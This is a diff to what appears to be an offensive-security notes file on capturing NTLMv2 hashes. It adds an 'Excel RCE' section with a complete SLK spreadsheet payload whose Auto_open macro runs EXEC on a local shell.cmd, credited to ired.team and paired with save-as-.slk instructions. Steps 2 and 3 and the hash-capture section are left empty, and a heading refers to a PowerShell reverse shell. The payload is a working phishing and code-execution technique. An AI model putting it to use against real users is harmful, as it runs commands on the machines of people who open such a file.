@@ -29,6 +29,27 @@ Objective is to capture NTLMv2 hashes by using the above programs. The user shou
 
 I found this exploit on [ired.team](https://ired.team/offensive-security/phishing-with-ms-office/phishing-.slk-excel) which gave a great walkthrough oh how to exactact perform RCE in an SLK file.
 
+### Excel RCE
+
+#### Setup
+1. Create an new text file, put the the below code and save it as .slk file:
+`
+ID;P
+O;E
+NN;NAuto_open;ER101C1;KOut Flank;F
+C;X1;Y101;K0;EEXEC("c:\shell.cmd")
+C;X1;Y102;K0;EHALT()
+E
+`
+
+2.
+3.
+
+#### CApture NTLMv2 Hash
+
+
+
+
 ### Excel RCE - Powershell Reverse shell
 ![](excel_NTLMv2_hash_capture.gif)
 
